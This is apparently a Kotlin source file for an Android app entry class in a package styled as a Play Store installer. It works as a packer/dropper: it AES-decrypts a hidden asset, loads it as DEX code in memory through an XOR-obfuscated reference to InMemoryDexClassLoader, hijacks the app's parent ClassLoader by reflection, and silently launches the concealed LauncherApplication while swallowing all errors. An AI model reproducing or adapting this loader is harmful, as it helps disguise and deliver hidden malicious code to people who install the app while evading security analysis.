package com.playstore.installer.berlin

import android.app.Application
import android.content.Context
import com.playstore.installer.BuildConfig
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.nio.ByteBuffer

class BerlinAppEntry : Application() {

    @Volatile private var h: ClassLoader? = null

    fun get(): ClassLoader? = h

    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)
        try { run() } catch (t: Throwable) { }
    }

    private fun run() {
        val assets = assets ?: return
        val enc: ByteArray = peel(assets.open(BuildConfig.BERLIN_DEX_ASSET)) ?: return
        if (enc.size < 17) { wipeArray(enc); return }
        val dex: ByteArray = aesDecrypt(enc, BuildConfig.BERLIN_DEX_KEY)
            ?: run { wipeArray(enc); return }
        wipeArray(enc)
        if (dex.size < 8) { wipeArray(dex); return }
        val n = byteArrayOf(0x3e,0x3b,0x36,0x2c,0x33,0x31,0x74,0x29,0x23,0x29,0x2e,0x3f,0x37,0x74,0x13,0x34,0x17,0x3f,0x37,0x35,0x28,0x23,0x1e,0x3f,0x22,0x19,0x36,0x3b,0x29,0x29,0x16,0x35,0x3b,0x3e,0x3f,0x28)
        val nc = CharArray(n.size); var ki = 0; while (ki < n.size) { nc[ki] = (n[ki].toInt() and 0xFF xor 0x5A).toChar(); ki++ }
        try {
            val cls = Class.forName(String(nc))
            val ctor = cls.getConstructor(ByteBuffer::class.java, ClassLoader::class.java)
            val b = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), null)) ?: return
            h = b; chainParent(b)
        } catch (t: Throwable) { return } finally { wipeArray(dex) }
    }

    override fun onCreate() { super.onCreate(); kick() }

    private fun kick() {
        val b = h ?: classLoader ?: return
        try {
            // Boot LauncherApplication from the decrypted DEX loaded in RAM
            val cls = Class.forName((packageName ?: return) + ".LauncherApplication", true, b)
            val app = cls.newInstance() as? Application ?: return
            val ae = byteArrayOf(0x3b,0x2e,0x2e,0x3b,0x39,0x32)
            val ac = CharArray(ae.size); var ai = 0; while (ai < ae.size) { ac[ai] = (ae[ai].toInt() and 0xFF xor 0x5A).toChar(); ai++ }
            val m = Application::class.java.getDeclaredMethod(String(ac), Context::class.java)
            m.isAccessible = true; m.invoke(app, baseContext); app.onCreate()
        } catch (t: Throwable) { }
    }

    private fun aesDecrypt(blob: ByteArray, keyHex: String): ByteArray? {
        if (blob.size < 17 || keyHex.length != 64) return null
        val k: ByteArray = try { ByteArray(32) { i -> keyHex.substring(i*2,i*2+2).toInt(16).toByte() } } catch (t: Throwable) { return null }
        return try {
            val iv = blob.copyOfRange(0,16); val ct = blob.copyOfRange(16,blob.size)
            val c = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding")
            c.init(javax.crypto.Cipher.DECRYPT_MODE, javax.crypto.spec.SecretKeySpec(k,"AES"), javax.crypto.spec.IvParameterSpec(iv))
            val r = c.doFinal(ct); wipeArray(k); wipeArray(iv); wipeArray(ct); r
        } catch (t: Throwable) { wipeArray(k); null }
    }

    private fun chainParent(c: ClassLoader?) {
        if (c == null) return
        try {
            val pe = byteArrayOf(0x2a,0x3b,0x28,0x3f,0x34,0x2e)
            val pc = CharArray(pe.size); var pi = 0; while (pi < pe.size) { pc[pi] = (pe[pi].toInt() and 0xFF xor 0x5A).toChar(); pi++ }
            val f = ClassLoader::class.java.getDeclaredField(String(pc)); f.isAccessible = true; f.set(classLoader, c)
        } catch (t: Throwable) { }
    }

    private fun peel(s: InputStream?): ByteArray? {
        if (s == null) return null
        val o = ByteArrayOutputStream(); val b = ByteArray(8192)
        try { var n = s.read(b); while (n != -1) { o.write(b,0,n); n = s.read(b) } } finally { try { s.close() } catch (t: Throwable) { } }
        return o.toByteArray()
    }

    private fun wipeArray(a: ByteArray?) { if (a == null) return; var i = 0; while (i < a.size) { a[i] = 0; i++ } }
}
